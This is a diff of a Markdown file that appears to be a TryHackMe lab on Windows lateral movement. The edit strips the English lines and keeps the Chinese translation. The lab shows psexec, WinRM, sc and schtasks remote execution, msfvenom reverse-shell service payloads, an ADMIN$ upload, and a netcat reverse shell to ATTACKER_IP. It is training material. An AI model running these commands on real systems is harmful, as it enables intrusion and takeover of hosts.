@@ -398,52 +398,40 @@ While performing most of the lateral movement techniques introduced throughout t
 
 ### Psexec 
 
-- **Ports:** 445/TCP (SMB) 端口：445/TCP （SMB）
+- **Ports:** 445/TCP (SMB) 
 - **Required Group Memberships:** Administrators  
     必需的组成员身份：管理员
 
-Psexec has been the go-to method when needing to execute processes remotely for years. It allows an administrator user to run commands remotely on any PC where he has access. Psexec is one of many Sysinternals Tools and can be downloaded [here](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec).  
-多年来，Psexec 一直是需要远程执行流程的首选方法。它允许管理员用户在他有权访问的任何 PC 上远程运行命令。Psexec 是众多 Sysinternals 工具之一，可在此处下载。
+多年来，Psexec 一直是需要远程执行流程的首选方法。它允许管理员用户在他有权访问的任何 PC 上远程运行命令。Psexec 是众多 Sysinternals 工具之一，可在[此处](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)下载。
 
-The way psexec works is as follows:  
 psexec 的工作方式如下：
 
-1. Connect to Admin$ share and upload a service binary. Psexec uses psexesvc.exe as the name.  
-    连接到 Admin$ 共享并上传服务二进制文件。Psexec 使用 psexesvc.exe 作为名称。
-2. Connect to the service control manager to create and run a service named PSEXESVC and associate the service binary with `C:\Windows\psexesvc.exe`.  
-    连接到服务控制管理器以创建并运行名为 PSEXESVC 的服务，并将服务二进制文件与 `C:\Windows\psexesvc.exe` 相关联。
-3. Create some named pipes to handle stdin/stdout/stderr.  
-    创建一些命名管道来处理 stdin/stdout/stderr。
+1. 连接到 Admin$ 共享并上传服务二进制文件。Psexec 使用 psexesvc.exe 作为名称。
+2. 连接到服务控制管理器以创建并运行名为 PSEXESVC 的服务，并将服务二进制文件与 `C:\Windows\psexesvc.exe` 相关联。
+3. 创建一些命名管道来处理 stdin/stdout/stderr。
 
 ![psexec explained](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a488102fe0da47a3667961400cf298d8.png)  
 
-To run psexec, we only need to supply the required administrator credentials for the remote host and the command we want to run (`psexec64.exe` is available under `C:\tools` in THMJMP2 for your convenience):  
 要运行 psexec，我们只需要提供远程主机所需的管理员凭据和我们要运行的命令（为方便起见，THMJMP2 中的 `C:\tools` 下提供了 `psexec64.exe` ）：
 
 ```shell-session
 psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
 ```
 
-  
-
 ### 使用 WinRM 创建远程进程
 
 - **Ports:** 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)  
-    端口：5985/TCP （WinRM HTTP） 或 5986/TCP （WinRM HTTPS）
 - **Required Group Memberships:** Remote Management Users  
     所需的组成员身份：远程管理用户
 
-Windows Remote Management (WinRM) is a web-based protocol used to send Powershell commands to Windows hosts remotely. Most Windows Server installations will have WinRM enabled by default, making it an attractive attack vector.  
 Windows 远程管理 （WinRM） 是一种基于 Web 的协议，用于将 Powershell 命令远程发送到 Windows 主机。默认情况下，大多数 Windows Server 安装都将启用 WinRM，使其成为一种有吸引力的攻击媒介。
 
-To connect to a remote Powershell session from the command line, we can use the following command:  
 若要从命令行连接到远程 Powershell 会话，可以使用以下命令：
 
 ```shell-session
 winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
 ```
 
-We can achieve the same from Powershell, but to pass different credentials, we will need to create a PSCredential object:  
 我们可以从 Powershell 实现相同的目的，但要传递不同的凭据，我们需要创建一个 PSCredential 对象：
 
 ```powershell
@@ -453,14 +441,12 @@ $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
 $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
 ```
 
-Once we have our PSCredential object, we can create an interactive session using the Enter-PSSession cmdlet:  
 获得 PSCredential 对象后，可以使用 Enter-PSSession cmdlet 创建交互式会话：
 
 ```powershell
 Enter-PSSession -Computername TARGET -Credential $credential
 ```
 
-Powershell also includes the Invoke-Command cmdlet, which runs ScriptBlocks remotely via WinRM. Credentials must be passed through a PSCredential object as well:  
 Powershell 还包括 Invoke-Command cmdlet，它通过 WinRM 远程运行 ScriptBlocks。凭据也必须通过 PSCredential 对象传递：
 
 ```powershell
@@ -471,33 +457,24 @@ Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami
 
 ### 使用 sc 远程创建服务
 
-- **Ports: 港口：**
-    - 135/TCP, 49152-65535/TCP (DCE/RPC)  
-        135/TCP、49152-65535/TCP （DCE/RPC）
+- **Ports: **
+    - 135/TCP, 49152-65535/TCP (DCE/RPC) 
     - 445/TCP (RPC over SMB Named Pipes)  
-        445/TCP（基于 SMB 命名管道的 RPC）445/TCP （RPC over SMB Named Pipes）
-    - 139/TCP (RPC over SMB Named Pipes)  
-        139/TCP（基于 SMB 命名管道的 RPC）139/TCP （RPC over SMB Named Pipes）
+    - 139/TCP (RPC over SMB Named Pipes) 
 - **Required Group Memberships:** Administrators  
     必需的组成员身份：管理员
 
-Windows services can also be leveraged to run arbitrary commands since they execute a command when started. While a service executable is technically different from a regular application, if we configure a Windows service to run any application, it will still execute it and fail afterwards.  
 Windows 服务也可用于运行任意命令，因为它们在启动时执行命令。虽然服务可执行文件在技术上与常规应用程序不同，但如果我们将 Windows 服务配置为运行任何应用程序，它仍将执行它并在之后失败。
 
-We can create a service on a remote host with sc.exe, a standard tool available in Windows. When using sc, it will try to connect to the Service Control Manager (SVCCTL) remote service program through RPC in several ways:  
 我们可以使用 sc.exe 在远程主机上创建服务，这是 Windows 中提供的标准工具。使用 sc 时，它将尝试通过 RPC 以多种方式连接到服务控制管理器 （SVCCTL） 远程服务程序：
 
-1. A connection attempt will be made using DCE/RPC. The client will first connect to the Endpoint Mapper (EPM) at port 135, which serves as a catalogue of available RPC endpoints and request information on the SVCCTL service program. The EPM will then respond with the IP and port to connect to SVCCTL, which is usually a dynamic port in the range of 49152-65535.  
-    将使用 DCE/RPC 进行连接尝试。客户端将首先连接到端口 135 上的端点映射器 （EPM），该端点用作可用 RPC 端点的目录，并请求有关 SVCCTL 服务程序的信息。然后，EPM 将使用 IP 和端口进行响应以连接到 SVCCTL，SVCCTL 通常是 49152-65535 范围内的动态端口。
+1.将使用 DCE/RPC 进行连接尝试。客户端将首先连接到端口 135 上的端点映射器 （EPM），该端点用作可用 RPC 端点的目录，并请求有关 SVCCTL 服务程序的信息。然后，EPM 将使用 IP 和端口进行响应以连接到 SVCCTL，SVCCTL 通常是 49152-65535 范围内的动态端口。
 
-![svcctl via RPC](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c4f288e73da9c0f4d480ad817b365fe5.png)  
-
-3. If the latter connection fails, sc will try to reach SVCCTL through SMB named pipes, either on port 445 (SMB) or 139 (SMB over NetBIOS).  
-    如果后一个连接失败，sc 将尝试通过端口 445 （SMB） 或 139 （SMB over NetBIOS） 上的 SMB 命名管道访问 SVCCTL。
+![svcctl via RPC](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c4f288e73da9c0f4d480ad817b365fe5.png) 2. 如果后一个连接失败，sc 将尝试通过端口 445 （SMB） 或 139 （SMB over NetBIOS） 上的 SMB 命名管道访问 SVCCTL。
 
 ![svcctl via named pipe](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0c425c37d692c771c944e38dca8c5879.png)  
 
-We can create and start a service named "THMservice" using the following commands:  
+
 我们可以使用以下命令创建并启动名为“THMservice”的服务：
 
 ```shell-session
@@ -505,10 +482,8 @@ sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= 
 sc.exe \\TARGET start THMservice
 ```
 
-The "net user" command will be executed when the service is started, creating a new local user on the system. Since the operating system is in charge of starting the service, you won't be able to look at the command output.  
 “net user”命令将在服务启动时执行，从而在系统上创建新的本地用户。由于操作系统负责启动服务，因此您将无法查看命令输出。
 
-To stop and delete the service, we can then execute the following commands:  
 要停止和删除服务，我们可以执行以下命令：
 
 ```shell-session
@@ -520,7 +495,6 @@ sc.exe \\TARGET delete THMservice
 
 ### 远程创建计划任务
 
-Another Windows feature we can use is Scheduled Tasks. You can create and run one remotely with schtasks, available in any Windows installation. To create a task named THMtask1, we can use the following commands:  
 我们可以使用的另一个 Windows 功能是计划任务。您可以使用 schtasks 远程创建和运行一个，在任何 Windows 安装中都可用。要创建名为 THMtask1 的任务，我们可以使用以下命令：
 
 ```shell-session
@@ -529,69 +503,43 @@ schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to 
 schtasks /s TARGET /run /TN "THMtask1" 
 ```
 
-We set the schedule type (/sc) to ONCE, which means the task is intended to be run only once at the specified time and date. Since we will be running the task manually, the starting date (/sd) and starting time (/st) won't matter much anyway.  
 我们将计划类型 （/sc） 设置为 ONCE，这意味着任务只在指定的时间和日期运行一次。由于我们将手动运行任务，因此开始日期 （/sd） 和开始时间 （/st） 无论如何都无关紧要。
 
-Since the system will run the scheduled task, the command's output won't be available to us, making this a blind attack.  
+
 由于系统将运行计划任务，因此该命令的输出将不可用，因此这是一种盲目攻击。
 
-Finally, to delete the scheduled task, we can use the following command and clean up after ourselves:  
 最后，要删除计划任务，我们可以使用以下命令并自行清理：
 
 ```shell-session
 schtasks /S TARGET /TN "THMtask1" /DELETE /F
 ```
 
-  
-
 ### Let's Get to Work!  
 
-To complete this exercise, you will need to connect to THMJMP2 using the credentials assigned to you in Task 1 from [http://distributor.za.tryhackme.com/creds](http://distributor.za.tryhackme.com/creds). If you haven't done so yet, click on the link and get credentials now. Once you have your credentials, connect to THMJMP2 via SSH:  
-要完成本练习，您需要使用在任务 1 中从 [http://distributor.za.tryhackme.com/creds](http://distributor.za.tryhackme.com/creds) 分配给您的凭据连接到 THMJMP2。如果您尚未这样做，请单击链接并立即获取凭据。获得凭据后，通过 SSH 连接到 THMJMP2：
-
-`ssh za\\<AD Username>@thmjmp2.za.tryhackme.com`
-
-For this exercise, we will assume we have already captured some credentials with administrative access:  
 在本练习中，我们假设我们已经捕获了一些具有管理访问权限的凭据：
 
 **User:** ZA.TRYHACKME.COM\t1_leonard.summers  
 用户：ZA.TRYHACKME.COM\t1_leonard.summers
 
-**Password:** EZpass4ever 密码：EZpass4ever
+**Password:** EZpass4ever 
 
-We'll show how to use those credentials to move laterally to THMIIS using `sc.exe`. Feel free to try the other methods, as they all should work against THMIIS.  
 我们将展示如何使用这些凭据通过 `sc.exe` 横向移动到 THMIIS。随意尝试其他方法，因为它们都应该对 THMIIS 起作用。
 
-While we have already shown how to use sc to create a user on a remote system (by using `net user`), we can also upload any binary we'd like to execute and associate it with the created service. However, if we try to run a reverse shell using this method, we will notice that the reverse shell disconnects immediately after execution. The reason for this is that service executables are different to standard .exe files, and therefore non-service executables will end up being killed by the service manager almost immediately. Luckily for us, msfvenom supports the `exe-service` format, which will encapsulate any payload we like inside a fully functional service executable, preventing it from getting killed.  
 虽然我们已经展示了如何使用 sc 在远程系统上创建用户（通过使用 `net user` ），但我们也可以上传我们想要执行的任何二进制文件并将其与创建的服务相关联。但是，如果我们尝试使用此方法运行反向 shell，我们会注意到反向 shell 在执行后立即断开连接。这样做的原因是服务可执行文件与标准.exe文件不同，因此非服务可执行文件最终几乎会立即被服务管理器杀死。幸运的是，msfvenom 支持 `exe-service` 格式，它将把我们喜欢的任何有效负载封装在一个功能齐全的服务可执行文件中，防止它被杀死。
-
-To create a reverse shell, we can use the following command:  
+ 
 要创建反向 shell，我们可以使用以下命令：
-
-**Note:** Since you will be sharing the lab with others, you'll want to use a different filename for your payload instead of "myservice.exe" to avoid overwriting someone else's payload.  
-注意：由于您将与他人共享实验室，因此您需要为有效负载使用不同的文件名，而不是“myservice.exe”，以避免覆盖其他人的有效负载。
-
-AttackBox  攻击框
 
 ```shell-session
 user@AttackBox$ msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
 ```
 
-We will then proceed to use t1_leonard.summers credentials to upload our payload to the ADMIN$ share of THMIIS using smbclient from our AttackBox:  
 然后，我们将继续使用 t1_leonard.summers 凭据，使用 AttackBox 中的 smbclient 将我们的有效负载上传到 THMIIS 的 ADMIN$ 共享：
-
-AttackBox  攻击框
-
 ```shell-session
 user@AttackBox$ smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
  putting file myservice.exe as \myservice.exe (0.0 kb/s) (average 0.0 kb/s)
 ```
 
-Once our executable is uploaded, we will set up a listener on the attacker's machine to receive the reverse shell from `msfconsole`:  
 上传可执行文件后，我们将在攻击者的机器上设置一个侦听器，以接收来自 `msfconsole` 的反向 shell：
-
-AttackBox  攻击框
-
 ```shell-session
 user@AttackBox$ msfconsole
 msf6 > use exploit/multi/handler
@@ -603,51 +551,25 @@ msf6 exploit(multi/handler) > exploit
 [*] Started reverse TCP handler on 10.10.10.16:4444
 ```
 
-Alternatively, you can run the following one-liner on your Linux console to do the same:  
 或者，您可以在 Linux 控制台上运行以下单行代码来执行相同的操作：
-
-AttackBox  攻击框
-
 ```shell-session
 user@AttackBox$ msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST lateralmovement; set LPORT 4444;exploit"
 ```
-
-Since `sc.exe` doesn't allow us to specify credentials as part of the command, we need to use `runas` to spawn a new shell with t1_leonard.summer's access token. Still, we only have SSH access to the machine, so if we tried something like `runas /netonly /user:ZA\t1_leonard.summers cmd.exe`, the new command prompt would spawn on the user's session, but we would have no access to it. To overcome this problem, we can use runas to spawn a second reverse shell with t1_leonard.summers access token:  
-由于 `sc.exe` 不允许我们在命令中指定凭据，因此我们需要使用 `runas` 生成一个带有 t1_leonard.summer 访问令牌的新 shell。尽管如此，我们只能对计算机进行 SSH 访问，因此，如果我们尝试类似 `runas /netonly /user:ZA\t1_leonard.summers cmd.exe` ，新的命令提示符将在用户会话中生成，但我们将无法访问它。为了克服这个问题，我们可以使用 runas 生成第二个带有 t1_leonard.summers 访问令牌的反向 shell：
-
-THMJMP2: Command Prompt  THMJMP2：命令提示符
-
-```shell-session
+由于 `sc.exe` 不允许我们在命令中指定凭据，因此我们需要使用 `runas` 生成一个带有 t1_leonard.summer 访问令牌的新 shell。尽管如此，我们只能对计算机进行 SSH 访问，因此，如果我们尝试类似 `runas /netonly /user:ZA\t1_leonard.summers cmd.exe` ，新的命令提示符将在用户会话中生成，但我们将无法访问它。为了克服这个问题，我们可以使用 runas 生成第二个带有 t1_leonard.summers 访问令牌的反向 shell： 
+```THMJMP2CommandPrompt 
 C:\> runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
 ```
 
-**Note:** Remember that since you are using `runas` with the `/netonly` option, it will not bother to check if the provided credentials are valid (more info on this on the [Enumerating AD room](https://tryhackme.com/room/adenumeration)), so be sure to type the password correctly. If you don't, you will see some ACCESS DENIED errors later in the room.  
 注意：请记住，由于您使用的是带有 `/netonly` 选项的 `runas` ，因此检查提供的凭据是否有效不会费心（更多信息请参阅枚举 AD 房间），因此请务必正确键入密码。否则，稍后将在聊天室中看到一些 ACCESS DENIED 错误。
 
-We can receive the reverse shell connection using nc in our AttackBox as usual:  
-我们可以像往常一样在 AttackBox 中使用 nc 接收反向 shell 连接：
-
-AttackBox  攻击框
+我们可以像往常一样使用 nc 接收反向 shell 连接：
 
 ```shell-session
 user@AttackBox$ nc -lvp 4443
 ```
-
-  
-
-And finally, proceed to create a new service remotely by using sc, associating it with our uploaded binary:  
 最后，继续使用 sc 远程创建一个新服务，将其与我们上传的二进制文件相关联：
-
-THMJMP2: Command Prompt (As t1_leonard.summers)  
-THMJMP2：命令提示符（如 t1_leonard.summers）
-
-```shell-session
+```THMJMP2CommandPrompt
 C:\> sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto
 C:\> sc.exe \\thmiis.za.tryhackme.com start THMservice-3249
 ```
-
-Be sure to change the name of your service to avoid clashing with other students.  
-请务必更改您的服务名称，以避免与其他学生发生冲突。
-
-Once you have started the service, you should receive a connection in your AttackBox from where you can access the first flag on t1_leonard.summers desktop.  
-启动服务后，您应该会在 AttackBox 中收到一个连接，从那里您可以访问 t1_leonard.summers 桌面上的第一个标志。
+启动服务后，您应该会收到一个连接，从那里您可以访问 t1_leonard.summers 桌面上的第一个标志。
